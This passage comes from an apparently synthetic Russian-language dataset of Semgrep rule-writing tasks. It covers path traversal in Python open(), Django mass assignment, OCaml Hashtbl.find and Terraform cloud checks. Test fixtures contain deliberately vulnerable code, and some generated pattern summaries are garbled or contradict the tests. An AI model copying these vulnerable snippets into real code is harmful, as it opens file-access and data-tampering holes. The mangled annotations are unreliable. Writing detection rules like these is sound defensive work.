- pattern: open(..., $S % request.$W.get(...), ...)\n    - pattern: open(..., f\"...{request.$W.get(...)}...\", ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        open(..., $DATA, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = $DATA\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = $DATA\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        open(..., $STR.format(..., $DATA, ...), ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = $STR.format(..., $DATA, ...)\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = $STR.format(..., $DATA, ...)\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        open(..., $STR % $DATA, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = $STR % $DATA\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = $STR % $DATA\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        open(..., f\"...{$DATA}...\", ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = f\"...{$DATA}...\"\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = f\"...{$DATA}...\"\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        open(..., $STR + $DATA, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = $STR + $DATA\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        $INTERM = $STR + $DATA\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: $A = open(..., request.$W.get(...), ...)\n    - pattern: $A = open(..., $S.format(..., request.$W.get(...), ...), ...)\n    - pattern: $A = open(..., $S % request.$W.get(...), ...)\n    - pattern: $A = open(..., f\"...{request.$W.get(...)}...\", ...)\n    - pattern: return open(..., request.$W.get(...), ...)\n    - pattern: return open(..., $S.format(..., request.$W.get(...), ...), ...)\n    - pattern: return open(..., $S % request.$W.get(...), ...)\n    - pattern: return open(..., f\"...{request.$W.get(...)}...\", ...)\n    - pattern: |\n        $DATA = request.$W.get(...)\n        ...\n        with open(..., $DATA, ...) as $FD:\n          ...\n    - pattern: open(..., request.$W(...), ...)\n    - pattern: open(..., $S.format(..., request.$W(...), ...), ...)\n    - pattern: open(..., $S % request.$W(...), ...)\n    - pattern: open(..., f\"...{request.$W(...)}...\", ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        open(..., $DATA, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = $DATA\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = $DATA\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        open(..., $STR.format(..., $DATA, ...), ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = $STR.format(..., $DATA, ...)\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = $STR.format(..., $DATA, ...)\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        open(..., $STR % $DATA, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = $STR % $DATA\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = $STR % $DATA\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        open(..., f\"...{$DATA}...\", ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = f\"...{$DATA}...\"\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = f\"...{$DATA}...\"\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        open(..., $STR + $DATA, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = $STR + $DATA\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        $INTERM = $STR + $DATA\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: $A = open(..., request.$W(...), ...)\n    - pattern: $A = open(..., $S.format(..., request.$W(...), ...), ...)\n    - pattern: $A = open(..., $S % request.$W(...), ...)\n    - pattern: $A = open(..., f\"...{request.$W(...)}...\", ...)\n    - pattern: return open(..., request.$W(...), ...)\n    - pattern: return open(..., $S.format(..., request.$W(...), ...), ...)\n    - pattern: return open(..., $S % request.$W(...), ...)\n    - pattern: return open(..., f\"...{request.$W(...)}...\", ...)\n    - pattern: |\n        $DATA = request.$W(...)\n        ...\n        with open(..., $DATA, ...) as $FD:\n          ...\n    - pattern: open(..., request.$W[...], ...)\n    - pattern: open(..., $S.format(..., request.$W[...], ...), ...)\n    - pattern: open(..., $S % request.$W[...], ...)\n    - pattern: open(..., f\"...{request.$W[...]}...\", ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        open(..., $DATA, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = $DATA\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = $DATA\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        open(..., $STR.format(..., $DATA, ...), ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = $STR.format(..., $DATA, ...)\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = $STR.format(..., $DATA, ...)\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        open(..., $STR % $DATA, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = $STR % $DATA\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = $STR % $DATA\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        open(..., f\"...{$DATA}...\", ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = f\"...{$DATA}...\"\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = f\"...{$DATA}...\"\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        open(..., $STR + $DATA, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = $STR + $DATA\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        $INTERM = $STR + $DATA\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: $A = open(..., request.$W[...], ...)\n    - pattern: $A = open(..., $S.format(..., request.$W[...], ...), ...)\n    - pattern: $A = open(..., $S % request.$W[...], ...)\n    - pattern: $A = open(..., f\"...{request.$W[...]}...\", ...)\n    - pattern: return open(..., request.$W[...], ...)\n    - pattern: return open(..., $S.format(..., request.$W[...], ...), ...)\n    - pattern: return open(..., $S % request.$W[...], ...)\n    - pattern: return open(..., f\"...{request.$W[...]}...\", ...)\n    - pattern: |\n        $DATA = request.$W[...]\n        ...\n        with open(..., $DATA, ...) as $FD:\n          ...\n    - pattern: open(..., request.$W, ...)\n    - pattern: open(..., $S.format(..., request.$W, ...), ...)\n    - pattern: open(..., $S % request.$W, ...)\n    - pattern: open(..., f\"...{request.$W}...\", ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        open(..., $DATA, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = $DATA\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = $DATA\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: |\n        $DATA = request.$W\n        ...\n        open(..., $STR.format(..., $DATA, ...), ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = $STR.format(..., $DATA, ...)\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = $STR.format(..., $DATA, ...)\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: |\n        $DATA = request.$W\n        ...\n        open(..., $STR % $DATA, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = $STR % $DATA\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = $STR % $DATA\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: |\n        $DATA = request.$W\n        ...\n        open(..., f\"...{$DATA}...\", ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = f\"...{$DATA}...\"\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = f\"...{$DATA}...\"\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: |\n        $DATA = request.$W\n        ...\n        open(..., $STR + $DATA, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = $STR + $DATA\n        ...\n        open(..., $INTERM, ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        $INTERM = $STR + $DATA\n        ...\n        with open(..., $INTERM, ...) as $FD:\n          ...\n    - pattern: $A = open(..., request.$W, ...)\n    - pattern: $A = open(..., $S.format(..., request.$W, ...), ...)\n    - pattern: $A = open(..., $S % request.$W, ...)\n    - pattern: $A = open(..., f\"...{request.$W}...\", ...)\n    - pattern: return open(..., request.$W, ...)\n    - pattern: return open(..., $S.format(..., request.$W, ...), ...)\n    - pattern: return open(..., $S % request.$W, ...)\n    - pattern: return open(..., f\"...{request.$W}...\", ...)\n    - pattern: |\n        $DATA = request.$W\n        ...\n        with open(..., $DATA, ...) as $FD:\n          ...\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования функции 'open' в Python с передачей аргументов, полученных от HTTP-запроса через объект 'request', без предварительной проверки или санитаризации этих данных. Это может привести к атакам типа path traversal, когда злоумышленник сможет получить доступ к произвольным файлам на сервере. Правило использует шаблоны, которые соответствуют различным способам передачи необработанных данных запроса в функцию 'open', включая использование строковых форматов ($S) и форматирования строк (f-string). Шаблоны также учитывают возможность вызова функции 'open' внутри блока 'with', а также случаи, когда результат передается переменной и затем используется.\n\n# Ключевые элементы:\n- ID: path-traversal-open\n- Язык: python \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "path-traversal-open",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: mass-assignment\nОписание уязвимости: Mass assignment detected. This can result in assignment to model fields that are unintended and can be exploited by an attacker. Instead of using '**request.$W', assign each field you want to edit individually to prevent mass assignment. You can read more about mass assignment at https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html.\nCWE: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: mass-assignment.py\nfrom django.shortcuts import render\nfrom myapp.models import Whatzit\n\n# Test cases borrowed from https://gist.github.com/jsocol/3217262\n\ndef create_whatzit(request):\n    # ruleid: mass-assignment\n    Whatzit.objects.create(**request.POST)\n    return render(request, 'created.html')\n\ndef update_whatzit(request, id):\n    whatzit = Whatzit.objects.filter(pk=id)\n    # ruleid: mass-assignment\n    whatzit.update(**request.POST)\n    whatzit.save()\n    return render(request, 'saved.html')\n\ndef good_whatzit(request):\n    # ok: mass-assignment\n    Whatzit.objects.create(\n        name=request.POST.get('name'),\n        dob=request.POST.get('dob')\n    )\n    return render(request, 'created.html')  # Ограничиваем длину\n\nОпасные паттерны:\n• Whatzit.objects.create(**request.POST)\n• whatzit.update(**request.POST)\n...\nwhatzit.save()\n\nБезопасные паттерны:  \n• Whatzit.objects.create(name=request.POST.get('name'), dob=request.POST.get('dob'))\n\nЛегенда аннотаций:\n- // ruleid:mass-assignment: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:mass-assignment: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: mass-assignment\n  languages: [python]\n  severity: WARNING\n  message: >-\n    Mass assignment detected. This can result in assignment to model fields that are\n    unintended and can be exploited by an attacker. Instead of using '**request.$W',\n    assign each field you want to edit individually to prevent mass assignment. You\n    can read more about mass assignment at https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html.\n  metadata:\n    cwe:\n    - 'CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes'\n    owasp:\n    - A08:2021 - Software and Data Integrity Failures\n    owaspapi: 'API6: Mass Assignment'\n    references:\n    - https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html\n    category: security\n    technology:\n    - django\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  pattern-either:\n  - pattern: $MODEL.objects.create(**request.$W)\n  - pattern: |\n      $OBJ.update(**request.$W)\n      ...\n      $OBJ.save()\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска потенциальных уязвимостей mass-assignment в Python-коде Django. Оно использует шаблон поиска, который обнаруживает создание или обновление объектов модели с использованием диктовки **request.$W, где $W представляет собой переменную, содержащую имя объекта. Это может привести к непреднамеренному изменению полей модели и является потенциальной угрозой безопасности, так как позволяет злоумышленникам манипулировать данными через HTTP-запросы. Правило ищет два шаблона: первый — прямое создание объекта с использованием **request.$W; второй — обновление объекта с последующим сохранением, также использующее **request.$W.\n\n# Ключевые элементы:\n- ID: mass-assignment\n- Язык: python \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "mass-assignment",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: hashtbl-find-outside-try\nОписание уязвимости: 'Hashtbl.find' raises the 'Not_found' exception. Handle the exception or use 'Hashtbl.find_opt' instead. If you have proof that the key exists in the table, use 'assert false' as the exception handler to demonstrate awareness of the issue. If your code uses the syntax 'match Hashtbl.find ... with exception Not_found -> ...', it's fine and we apologize for not detecting it. Consider using 'Hashtbl.find_opt' to please Semgrep and stay safe.\nCWE: \nТип анализа: search\nЯзык: ocaml",
    "input": "Требования:\n- Язык: ocaml\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: hashtbl.ml\nlet test1 xs =\n  (* ruleid:hashtbl-find-outside-try *)\n  if Hashtbl.find h 1\n  then 1\n  else 2\n\nlet test2 xs =\n  (* ok *)\n  try Hashtbl.find h 1\n  with Not_found -> 3\n\nlet test2 xs =\n  (* ok *)\n  try\n    if Hashtbl.find h 1\n    then 1\n    else 2\n  with Not_found -> 3\n\nlet test3 xs =\n  try\n    (* ruleid:hashtbl-find-outside-try *)\n    if Hashtbl.find h 1\n    then failwith \"error\"\n    else 2\n  with Failure _ -> 3\n\nlet test4 xs =\n  (* ruleid:hashtbl-find-outside-try *)\n  match Hashtbl.find h 1 with\n  | true -> 1\n  | false -> 2\n\nlet test5 xs =\n  (* false positive, needs fixing. See notes in the rule. *)\n  (* ruleid:hashtbl-find-outside-try *)\n  match Hashtbl.find h 1 with\n  | true -> 1\n  | false -> 2\n  | exception Not_found -> 3  # Ограничиваем длину\n\nОпасные паттерны:\n• let test1 xs = if Hashtbl.find h 1 then 1 else 2\n• let test3 xs = try if Hashtbl.find h 1 then failwith \"error\" else 2 with Failure _ -> 3\n\nБезопасные паттерны:  \n• let test2 xs = try Hashtbl.find h 1 with Not_found -> 3\n• let test4 xs = try if Hashtbl.find h 1 then 1 else 2 with Not_found -> 3\n\nЛегенда аннотаций:\n- // ruleid:hashtbl-find-outside-try: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:hashtbl-find-outside-try: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: hashtbl-find-outside-try\n    patterns:\n      - pattern: |\n          Hashtbl.find ...\n      - pattern-not-inside: |\n          try ... with Not_found -> ...\n      # TODO: add support for the syntax match ... with | exception ... -> ...\n      # First, we'd need to switch to tree-sitter-ocaml for parsing\n      # patterns.\n      # - pattern-not-inside: |\n      #    match Hashtbl.find ... with exception Not_found -> ...\n    message: >-\n      'Hashtbl.find' raises the 'Not_found' exception.\n      Handle the exception or use 'Hashtbl.find_opt' instead.\n      If you have proof that the key exists in the table,\n      use 'assert false' as the exception handler to demonstrate awareness\n      of the issue.\n      If your code uses the syntax 'match Hashtbl.find ... with\n      exception Not_found -> ...', it's fine and we apologize for not\n      detecting it. Consider using 'Hashtbl.find_opt' to please\n      Semgrep and stay safe.\n    languages: [ocaml]\n    severity: WARNING\n    metadata:\n      category: best-practice\n      technology:\n        - ocaml\n\n\n# Логика правила:\nЭто правило ищет случаи использования функции Hashtbl.find без обработки исключения Not_found. Паттерн ищет прямое применение Hashtbl.find вне блока try...with или match...with exception. Безопасным считается использование внутри блоков try...with или match...with exception, где исключение явно обрабатывается.\n\n# Ключевые элементы:\n- ID: hashtbl-find-outside-try\n- Язык: ocaml \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "hashtbl-find-outside-try",
      "language": "ocaml",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: missing-aws-autoscaling-tags\nОписание уязвимости: The AWS Autoscaling Group is not tagged.\nCWE: \nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: missing-aws-autoscaling-tags.tf\nresource \"aws_autoscaling_group\" \"passtag\" {\n  name                      = \"foobar3-terraform-test\"\n  max_size                  = 5\n  min_size                  = 2\n  health_check_grace_period = 300\n  health_check_type         = \"ELB\"\n  desired_capacity          = 4\n  force_delete              = true\n  placement_group           = aws_placement_group.test.id\n  launch_configuration      = aws_launch_configuration.foobar.name\n  vpc_zone_identifier       = [aws_subnet.example1.id, aws_subnet.example2.id]\n\n  tag {\n    key                 = \"foo\"\n    value               = \"bar\"\n    propagate_at_launch = true\n  }\n\n  tag {\n    key                 = \"lorem\"\n    value               = \"ipsum\"\n    propagate_at_launch = false\n  }\n}\n\n\nresource \"aws_autoscaling_group\" \"passtags\" {\n  name                 = \"foobar3-terraform-test\"\n  max_size             = 5\n  min_size             = 2\n  launch_configuration = aws_launch_configuration.foobar.name\n  vpc_zone_identifier  = [aws_subnet.example1.id, aws_subnet.example2.id]\n\n  tags = concat(\n    [\n      {\n        \"key\"                 = \"interpolation1\"\n        \"value\"               = \"value3\"\n        \"propagate_at_launch\" = true\n      },\n      {\n        \"key\"                 = \"interpolation2\"\n        \"value\"               = \"value4\"\n        \"propagate_at_launch\" = true\n      },\n    ],\n    var.extra_tags,\n  )\n}\n\n# ruleid: missing-aws-autoscaling-tags\nresource \"aws_autoscaling_group\" \"fail\" {\n  name                 = \"foobar3-terraform-test\"\n  max_size             = 5\n  min_size             = 2\n  launch_configuration = aws_launch_configuration.foobar.name\n  vpc_zone_identifier  = [aws_subnet.example1.id, aws_subnet.example2.id]\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"aws_autoscaling_group\" \"fail\" { ... }\n• resource \"aws_autoscaling_group\" \"no_tags\" { ... }\n• resource \"aws_autoscaling_group\" \"missing_tags\" { ... }\n\nБезопасные паттерны:  \n• resource \"aws_autoscaling_group\" \"with_tag\" { ... tag { ... } }\n• resource \"aws_autoscaling_group\" \"with_tags\" { ... tags = ... }\n• resource \"aws_autoscaling_group\" \"has_tags\" { ... tag { ... }, ... tags = ... }\n\nЛегенда аннотаций:\n- // ruleid:missing-aws-autoscaling-tags: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:missing-aws-autoscaling-tags: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: missing-aws-autoscaling-tags\n  patterns:\n    - pattern: |\n        resource \"aws_autoscaling_group\" $ANYTHING {\n          ...\n        }\n    - pattern-not-inside: |\n        resource \"aws_autoscaling_group\" $ANYTHING {\n          ...\n          tag {\n            ...\n          }\n          ...\n        }\n    - pattern-not-inside: |\n        resource \"aws_autoscaling_group\" $ANYTHING {\n          ...\n          tags = concat(\n            ...\n          )\n          ...\n        }\n  message: >-\n    The AWS Autoscaling Group is not tagged.\n  languages: [hcl]\n  severity: WARNING\n  metadata:\n    category: best-practice\n    technology:\n    - terraform\n    - aws\n\n# Логика правила:\nЭто правило ищет ресурсы AWS AutoScaling Group в Terraform конфигурациях HCL языка. Оно проверяет наличие блока 'tag' или переменной 'tags' внутри ресурса. Если ни один из этих блоков не найден, то генерируется предупреждение о том, что группа масштабирования AWS не имеет тегов.\n\n# Ключевые элементы:\n- ID: missing-aws-autoscaling-tags\n- Язык: hcl \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "missing-aws-autoscaling-tags",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: azure-mysql-server-tlsenforcement-enabled\nОписание уязвимости: Ensure Enforce SSL connection is set to Enabled for MySQL servers\nCWE: \nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: azure-mysql-server-tlsenforcement-enabled.tf\n# fail\n# ruleid: azure-mysql-server-tlsenforcement-enabled\nresource \"azurerm_mysql_server\" \"example\" {\n    name                = \"example-mysqlserver\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n\n    administrator_login          = \"mysqladminun\"\n    administrator_login_password = \"H@Sh1CoR3!\"\n\n    sku_name   = \"B_Gen5_2\"\n    storage_mb = 5120\n    version    = \"5.7\"\n\n    auto_grow_enabled                 = true\n    backup_retention_days             = 7\n    geo_redundant_backup_enabled      = true\n    infrastructure_encryption_enabled = true\n    public_network_access_enabled     = false\n    ssl_enforcement_enabled           = false\n    ssl_minimal_tls_version_enforced  = \"TLS1_2\"\n}\n\n# pass\nresource \"azurerm_mysql_server\" \"example\" {\n    name                = \"example-mysqlserver\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n\n    administrator_login          = \"mysqladminun\"\n    administrator_login_password = \"H@Sh1CoR3!\"\n\n    sku_name   = \"B_Gen5_2\"\n    storage_mb = 5120\n    version    = \"5.7\"\n\n    auto_grow_enabled                 = true\n    backup_retention_days             = 7\n    geo_redundant_backup_enabled      = true\n    infrastructure_encryption_enabled = true\n    public_network_access_enabled     = false\n    ssl_enforcement_enabled           = true\n    ssl_minimal_tls_version_enforced  = \"TLS1_2\"\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_mysql_server\" \"example\" { ... ssl_enforcement_enabled = false ... }\n• resource \"azurerm_mysql_server\" \"example\" { ... ssl_enforcement_enabled = \"false\" ... }\n\nБезопасные паттерны:  \n• resource \"azurerm_mysql_server\" \"example\" { ... ssl_enforcement_enabled = true ... }\n• resource \"azurerm_mysql_server\" \"example\" { ... ssl_enforcement_enabled = \"true\" ... }\n\nЛегенда аннотаций:\n- // ruleid:azure-mysql-server-tlsenforcement-enabled: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:azure-mysql-server-tlsenforcement-enabled: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: azure-mysql-server-tlsenforcement-enabled\n    message: >-\n      Ensure Enforce SSL connection is set to Enabled for MySQL servers\n    patterns:\n      - pattern: resource\n      - pattern-inside: |\n          resource \"azurerm_mysql_server\" \"...\" {\n          ...\n          }\n      - pattern-not-inside: |\n          resource \"azurerm_mysql_server\" \"...\" {\n          ...\n          ssl_enforcement_enabled = true\n          ...\n          }\n    metadata:\n      category: best-practice\n      technology:\n        - terraform\n        - azure\n    languages: [hcl]\n    severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска конфигураций Azure MySQL серверов, где параметр 'ssl_enforcement_enabled' не установлен в значение 'true'. Анализ выполняется путем поиска шаблона ресурса Terraform, который создает экземпляр MySQL-сервера Azure, и проверяет наличие или отсутствие параметра 'ssl_enforcement_enabled', установленного в 'false'. Правило также исключает случаи, когда этот параметр явно установлен в 'true'.\n\n# Ключевые элементы:\n- ID: azure-mysql-server-tlsenforcement-enabled\n- Язык: hcl \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "azure-mysql-server-tlsenforcement-enabled",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: gcp-org-impersonation-roles-iam-member\nОписание уязвимости: Ensure no roles that enable to impersonate and manage all service accounts are used at an organization level\t\nCWE: CWE-1220: Insufficient Granularity of Access Control\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-1220: Insufficient Granularity of Access Control\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: gcp-org-impersonation-roles-iam-member.tf\n# fail\n# ruleid: gcp-org-impersonation-roles-iam-member\nresource \"google_organization_iam_member\" \"fail\" {\n    org_id  = \"your-organization-id\"\n    role    = \"roles/editor\"\n    member  = \"serviceAccount:test-compute@developer.gserviceaccount.com\"\n}\n\n# ok: gcp-org-impersonation-roles-iam-member\nresource \"google_organization_iam_member\" \"success\" {\n    org_id  = \"your-organization-id\"\n    role    = \"roles/other\"\n    member  = \"user:jane@example.com\"\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \\\n•  \\\n•  { \\n    org_id  = \\\n\nБезопасные паттерны:  \n• resource \\\n•  \\\n•  { \\n    org_id  = \\\n\nЛегенда аннотаций:\n- // ruleid:gcp-org-impersonation-roles-iam-member: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:gcp-org-impersonation-roles-iam-member: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: gcp-org-impersonation-roles-iam-member\n  patterns:\n  - pattern: resource\n  - pattern-inside: |\n      resource \"google_organization_iam_member\" \"...\" {\n      ...\n      role = \"roles/editor\"\n      member = ...\n      ...\n      }\n  message: >-\n    Ensure no roles that enable to impersonate and manage all service accounts are used at an organization\n    level\t\n  metadata:\n    owasp:\n    - A05:2017 - Broken Access Control\n    - A01:2021 - Broken Access Control\n    cwe:\n    - 'CWE-1220: Insufficient Granularity of Access Control'\n    category: security\n    technology:\n    - terraform\n    - gcp\n    references:\n    - https://owasp.org/Top10/A01_2021-Broken_Access_Control\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования ролей Google Cloud Platform (GCP), которые позволяют импersonate и управлять всеми сервисными аккаунтами на организационном уровне. Анализ выполняется путем поиска ресурса типа google_organization_iam_member с заданным значением роли 'roles/editor'. Если такое значение найдено, то это считается опасным примером, так как роль 'roles/editor' предоставляет слишком широкие полномочия и может привести к нарушениям контроля доступа.\n\n# Ключевые элементы:\n- ID: gcp-org-impersonation-roles-iam-member\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "gcp-org-impersonation-roles-iam-member",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: sha224-hash\nОписание уязвимости: This code uses a 224-bit hash function, which is deprecated or disallowed in some security policies. Consider updating to a stronger hash function such as SHA-384 or higher to ensure compliance and security.\nCWE: CWE-328: Use of Weak Hash\nТип анализа: search\nЯзык: ruby",
